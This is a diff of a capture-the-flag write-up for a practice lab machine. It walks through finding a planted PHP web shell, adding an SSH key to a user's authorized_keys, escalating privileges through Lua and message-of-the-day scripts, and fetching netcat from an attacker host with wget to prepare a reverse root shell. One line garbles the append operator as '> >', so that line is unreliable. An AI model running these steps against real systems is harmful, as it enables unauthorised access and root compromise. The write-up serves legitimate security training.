@@ -22,7 +22,7 @@ This box includes the following techniques:
 
 This box is running a web server hosting a page with a secret php web-shell backdoor,I use this to access the machine and add My pub ssh key to. After connecting to SSH I found a program called Lua, I use this to privesc to sysadmin. Finally I exploit the message of the day to gain root.  
 
-I Start **nmap** scan as per normal.  
+I Start **nmap** scan as per normal.   
 `sudo nmap -sC -sV 10.10.10.181`
 
 <p align="center">
@@ -37,13 +37,15 @@ Next I checked the source code. In the source I found this comment **#!--Some of
   <img class="image" width="auto" height="auto" src="/assets/tb/1-2.png">
 </p>
 
-Next I went to google to search for common web-shells. I found none of these running on the server. Then I decided to google the comment on the page.
+Next I went to google to search for common web-shells. I found none of these running on the server.  
+
+Then I decided to google the comment on the page.
 
 <p align="center">
   <img class="image" width="auto" height="auto" src="/assets/tb/1-3.png">
 </p>  
 
-This result showed a **Github*****Repo** that contained that very comment, Upon inspection it had a list of  php web-shells.  
+This result showed a **Github Repo** that contained that very comment, Upon inspection it had a list of  php web-shells.  
 
 <p align="center">
   <img class="image" width="auto" height="auto" src="/assets/tb/1-4.png">
@@ -86,9 +88,9 @@ This showed his home directory.
 
 I notice I have full **read/write** access to the user's .ssh folder. So I plan on adding my **SSH** public key to his **authorized_keys** to allow me to login via **SSH**.  
 
-I Navigate into the **.ssh** folder.  
+I Navigate into the `.ssh` folder.  
 
-Now I need a copy of my **id_rsa.pub**. Navigate to `/home****/kali/.ssh`
+Now I need a copy of my **id_rsa.pub**. Navigate to `/home/kali/.ssh`
 
 <p align="center">
   <img class="image" width="auto" height="auto" src="/assets/tb/1-10.png">
@@ -107,7 +109,7 @@ ssh-keygen
   <img class="image" width="auto" height="auto" src="/assets/tb/1-11.png">
 </p>  
 
-This makes the two files in your **.ssh** folder.  
+This makes the two files in your `.ssh` folder.  
 
 Time to add my **.pub** to the authorized_keys.(REPLACE "YOURPUBLICKEY" for yours)
 ```bash
@@ -147,7 +149,8 @@ sudo -l
 Here it shows that we can run the file “**luvit**” as sysadmin with no password which is located in the sysadmin's home dir. Next I checked **GTFOBins** to see if you can use **Lua** to **priv esc**.  
 
 [GTFOBins](https://gtfobins.github.io) is a list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. This can result in breaking out of restricted shells, transferring data or even privilege escalation.  
-https://gtfobins.github.io/gtfobins/lua/
+
+[https://gtfobins.github.io/gtfobins/lua/](https://gtfobins.github.io/gtfobins/lua/)
 
 
 <p align="center">
@@ -178,7 +181,7 @@ Success! I am now sysadmin. Lets see if I have a User flag!
   <img class="image" width="auto" height="auto" src="/assets/tb/1-19.png">
 </p>    
 
-In the home dir I find the **user.txt** flag. Now to find a method for Priv esc to root. I noticed when we first logged into **SSH** It had a custom message of the day, let's investigate.   
+In the home dir I find the **user.txt** flag. Now to find a method for Privesc to root. I noticed when we first logged into **SSH** It had a custom message of the day, let's investigate.   
 
 <p align="center">
   <img class="image" width="auto" height="auto" src="/assets/tb/1-20.png">
@@ -194,7 +197,7 @@ Let's see if I have code execution. I tested this with “id”.
 ```bash
 echo “id” >> 00-header  
 ```
-p.s when echoing into files using >> will append the echo'd texted to the end of the file, whereas using > will overwrite the file with just the echo'd text.
+p.s when echoing into files using > > will append the echo'd texted to the end of the file, whereas using > will overwrite the file with just the echo'd text.
 
 <p align="center">
   <img class="image" width="auto" height="auto" src="/assets/tb/1-22.png">
@@ -206,7 +209,7 @@ Let's see if it works by logging out of **SSH** and logging back in.
   <img class="image" width="auto" height="auto" src="/assets/tb/1-23.png">
 </p>   
 
-It worked! We have command execution as root. Now we can use **cat** to read the **root.txt** flag.  
+It worked! We have command execution as root. Now we can use `cat` to read the **root.txt** flag.  
 ```bash
 echo"cat /root/root.txt" >> 00-header  
 ```
@@ -214,7 +217,8 @@ echo"cat /root/root.txt" >> 00-header
   <img class="image" width="auto" height="auto" src="/assets/tb/1-24.png">
 </p>   
 
-I now have the root flag! If you really want to own a machine you are going to want a reverse root shell, here is how to do that!
+I now have the root flag! If you really want to own a machine you are going to want a reverse root shell, here is how to do that!  
+
 ---
 ### Gaining a root shell  
 
@@ -230,7 +234,7 @@ python -m SimpleHTTPServer
   <img class="image" width="auto" height="auto" src="/assets/tb/1-26.png">
 </p>   
 
-Now I need to navigate to the `/tmp` dir, Then I used **wget** to download “nc” to the `/tmp` dir and also used `chmod` to make it an executable file.
+Now I need to navigate to the `/tmp` dir, Then I used **wget** to download **nc** to the `/tmp` dir and also used `chmod` to make it an executable file.
 ```bash
 wget http://10.10.14.28:8000/nc;chmod +x nc
 ```
